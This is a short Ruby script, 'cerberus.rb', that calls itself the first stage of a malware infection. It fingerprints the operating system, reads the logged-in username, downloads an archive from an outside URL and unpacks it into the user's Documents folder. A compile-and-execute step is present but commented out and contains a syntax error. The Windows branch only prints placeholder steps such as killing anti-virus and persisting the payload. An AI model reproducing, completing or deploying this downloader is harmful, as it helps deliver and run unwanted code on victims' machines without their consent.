#!/usr/bin/ruby

=begin

cerberus.rb

Written by Voodoo
March 31, 2014

Description:
		Cerberus is a compact script written in the Ruby.  It acts as the first stage of a malware infection
		by downloading, unpacking, and executing malicious code based on the OS fingerprint.

=end

require 'fileutils'
require 'open-uri'
require 'rbconfig'
require 'etc'

include Config

#global variables
$source_repo = "https://aur.archlinux.org/packages/ar/archey/"

##Fingerprint the operating system
def fingerprint

    case CONFIG['host_os']
    	 when /mswin|windows/i
	      return -1
	 when /linux/i
	      return 1
	 else
		return 1 # assume *nix
    end

end


##Get the name of the current user
def getUser()
    return Etc.getlogin
end


##Download the malicious zip file
def dl(file_name)

    success = 0

    open(file_name, 'wb') do |file|
    success = 1
    file << open($source_repo + file_name).read
    end

    return success

end

=begin
##Unpack the file
def unpack(file, destination)

    success = 0

    Zip::ZipFile.open(file) { |zip_file|

    	zip_file.each { |f|

		      f_path=File.join(destination, f.name)
		      fileUtils.mkdir_p(File.dirname(f_path))
		      zip_file.extact(f, f_path) unless File.exist?(f_path)

	}

	success = 1

    }


    return success

end
=end

def unzip(f, d)
    `tar -xzvf #{f} -C #{d}`
    return 1
end


#Compile and execute the downloaded code
def compile_execute(make_file)
    `make {#make_file}`
end


#================================================


osversion = fingerprint() #call to fingerprint() function
username = getUser() #get current logged in user
payload = "archey.tar.gz" #name of payload

if osversion > 0

   target_dir = "/Users/" + username + "/Documents/"

   puts "[*] Fetching payload"
   if dl(payload) > 0
      puts "[+] Downloaded"
   else 
   	abort("[-] Download Failed")
   end


   puts "[*] Unpacking..."
   if unzip(payload, target_dir) > 0
      puts "[+] archive extracted to " + target_dir
   else
	abort("[-] Extraction Failed")
   end

   puts "[*] Compile and execute payload"
   #compile_execute(target_dir + "Botnet/BotClient" + "makefile")

else

   target_dir = "/Windows/System32/"
   puts "[*] Killing Anti-Virus"
   puts "[*] Downloading and installing miniGW"
   puts "[*] Fetching Payload"
   puts "[*] Persisting the payload on the system"
   puts "[*] Compile and execute the payload"

end